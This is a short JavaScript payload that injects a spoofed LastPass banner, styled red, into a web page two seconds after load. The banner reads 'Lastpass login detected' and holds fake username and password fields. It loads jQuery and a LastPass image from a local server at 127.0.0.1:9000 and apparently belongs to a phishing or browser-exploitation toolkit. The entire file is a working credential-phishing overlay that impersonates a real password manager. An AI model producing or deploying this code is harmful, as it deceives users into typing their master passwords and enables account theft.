//load in jquery (a little uneccessary possibly for this script)
var script = document.createElement('script');
script.src = "http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js";
script.onload = function () {

	var content = '<style>' + 
'#container {' + 
'    visibility: visible;' + 
'    display: block;' + 
'    max-height: 30px;' + 
'}' +
'.reveal-modal {' + 
'    background: -webkit-linear-gradient(#c91c2d, #900311); /* For Safari 5.1 to 6.0 */' + 
'    background: -o-linear-gradient(#c91c2d, #900311); /* For Opera 11.1 to 12.0 */' + 
'    background: -moz-linear-gradient(#c91c2d, #900311); /* For Firefox 3.6 to 15 */' + 
'    background: linear-gradient(#c91c2d, #900311); /* Standard syntax */' + 
'    /*background:#900311; */' + 
'    margin: 0 auto;' + 
'    width:100%; ' + 
'    position: fixed;' + 
'    top: 0;' + 
'    left: 0;' + 
'    z-index:41;' + 
'    font-family: Helvetica;' + 
'    padding:10px; ' + 
'    color: white;' + 
'    /*-webkit-box-shadow:0 0 10px rgba(0,0,0,0.4);' + 
'    -moz-box-shadow:0 0 10px rgba(0,0,0,0.4); ' + 
'    box-shadow:0 0 10px rgba(0,0,0,0.4);*/' + 
'}' +
'.lpbutton {' + 
'  background-color: #eeeeee;' + 
'  border: 1px solid #ccc;' + 
'  border-bottom: 1px solid #bbb;' + 
'  border-radius: 2px;' + 
'  color: #333;' + 
'  line-height: 1;' + 
'  font-weight: bold;' + 
'  text-align: center;' + 
'  text-shadow: 0 1px 0 #eee;' + 
'  /*width: auto;*/' + 
'  /*float: right;*/' + 
'  margin: 0px 15px 2px 2px;' + 
'  /*height: 17px;*/' +
'  padding: 3px 6px 2px 6px;' + 
'  font-size: 13px;' + 
'  font-family: Helvetica;' + 
'}' +
'.loginform {' + 
'  float: right;' + 
'  margin: 0px 10px !important;' + 
'}' +
'</style>' + 
'<div id="container">' + 
'  <div id="exampleModal" class="reveal-modal">' + 
'       <img src="http://127.0.0.1:9000/public/img/lastpass.gif">' + 
'       Lastpass login detected:' + 
'       <div class="loginform">' + 
'         <input type="text" lptype="tryusername" id="lpusername" class="lpbutton" placeholder="username">' + 
'         <input type="text" lptype="trypassword" id="lppassword" class="lpbutton" placeholder="password">' + 
'         <button type="button" lptype="tryagainbtn" id="lplogin" class="lpbutton" value="login">Login</button>' + 
'       </div>' + 
'  </div>' + 
'</div>' 
	
setTimeout( function() {
	$( "body" ).prepend(content);
}, 2000 );
    

		
};

document.head.appendChild(script); //or something of the likes

